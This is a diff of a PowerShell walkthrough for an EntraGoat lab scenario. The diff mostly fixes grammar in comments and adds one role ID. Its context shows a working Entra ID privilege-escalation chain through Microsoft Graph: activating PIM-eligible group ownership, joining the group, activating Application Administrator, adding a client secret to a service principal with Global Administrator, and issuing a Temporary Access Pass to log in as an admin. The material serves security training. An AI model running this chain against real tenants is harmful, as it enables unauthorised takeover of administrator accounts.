@@ -27,9 +27,9 @@ Attack flow:
 
 - - -
 
---> So... why this works?
+--> So... why does this work?
 - PIM eligibility for ownership enables self-service elevation to group ownership.
-- Ownership permits adding self as group member.
+- Ownership permits adding oneself as a group member.
 - The group's eligible Application Administrator role can be activated via PIM.
 - Application Administrator can add credentials to enterprise apps.
 - Service principal sits in a group with Global Administrator rights.
@@ -101,7 +101,7 @@ foreach ($eligibleRole in $eligibleRoles) {
 
 <#
 well, just like in scenario 3 but with 2 extra steps:
-    1. Activate eligible ownership of "Application Operations Team" group and add ourselves as member
+    1. Activate the eligible ownership of the "Application Operations Team" group and add ourselves as members
     2. Activate the group's eligible Application Administrator role
     from there, we can add creds to any service principal in the tenant, which we'll focus again on SP with PRA, PAA or GA roles for simplicity.
 #>
@@ -179,7 +179,7 @@ Note:
 
 # Step 5: Executing the attack path 
 
-# The first step is to activate eligible ownership of "Application Operations Team" group and add ourselves as members
+# The first step is to activate the eligible ownership of the "Application Operations Team" group and add ourselves as members
 $appOpsGroup = Get-MgGroup -Filter "displayName eq 'Application Operations Team'"
 
 <#
@@ -188,7 +188,7 @@ The following step can also be done via the UI:
     2. Eligible assignments tab
     3. Click Activate on the wanted group -> fill Reason ("very important tasks ahead") -> Activate.
     4. Wait ~ 30 seconds -> re-sign-in or refresh token; role shows as Active.
-    5. Add self as member through group management.
+    5. Add yourself as a member through group management.
 
     Read the blog post for more details and pretty screenshots!
 #>
@@ -212,9 +212,9 @@ Invoke-MgGraphRequest -Method POST `
     -Uri "https://graph.microsoft.com/beta/identityGovernance/privilegedAccess/group/assignmentScheduleRequests" `
     -Body $ownerActivationParams -ContentType "application/json"
 
-# wait for activations to complete - this may take few minutes
+# wait for activations to complete - this may take a few minutes
 
-# Add ourselves to the group as member
+# Add ourselves to the group as members
 $memberParams = @{
     "@odata.id" = "https://graph.microsoft.com/v1.0/users/$($currentUser.Id)"
 }
@@ -225,6 +225,8 @@ $groupIDs = Get-MgUserMemberOf -UserId $currentUser.Id -All
 foreach ($groupID in $groupIDs) {
     Get-MgGroup -GroupId $groupID.Id
 }
+
+$appAdminRoleId = "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3"
 
 # Activate the group's eligible Application Administrator role
 $roleActivationParams = @{
@@ -242,7 +244,7 @@ $roleActivationParams = @{
     justification    = "just another task that requires Application administration"
 }
 
-# we use the directory roles endpoint instead of the group endpoint since its OUR eligible role assignment (which we got through membership) that we are activating.
+# we use the directory roles endpoint instead of the group endpoint since it's OUR eligible role assignment (which we got through membership) that we are activating.
 Invoke-MgGraphRequest -Method POST `
     -Uri "https://graph.microsoft.com/beta/roleManagement/directory/roleAssignmentScheduleRequests" `
     -Body $roleActivationParams -ContentType "application/json"
@@ -258,7 +260,7 @@ Connect-MgGraph
 
 
 # Step 4: Pivoting into the service principal's context
-# lets find the target SP and add client secret to it
+# lets find the target SP and add the client secret to it
 $SP = Get-MgServicePrincipal -Filter "displayName eq 'Infrastructure Monitoring Tool'"
 
 $secretDescription = "EntraGoat-Secret-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
@@ -307,7 +309,7 @@ $tempAccessPass = @{
      "isUsableOnce" = $false
  }
 $TAP = New-MgUserAuthenticationTemporaryAccessPassMethod -UserId $targetAdmin.Id -BodyParameter $tempAccessPass
-$TAP.TemporaryAccessPass   # log in as the admin user with the TAP to Azure Portal      
+$TAP.TemporaryAccessPass   # log in as the admin user with the TAP to the Azure Portal      
 
 Disconnect-MgGraph
 
@@ -325,7 +327,7 @@ Invoke-MgGraphRequest -Uri 'https://graph.microsoft.com/v1.0/me?$select=id,userP
 
 Disconnect-MgGraph
 
-# Don't forget to run the cleanup script to restore the tenant to it's original state!
-# To learn more about how the scenario is created, consider running the setup script with the -Verbose flag and reviewing the its source code.
+# Don't forget to run the cleanup script to restore the tenant to its original state!
+# To learn more about how the scenario is created, consider running the setup script with the -Verbose flag and reviewing its source code.
 
 # Official blog post: https://www.semperis.com/blog/
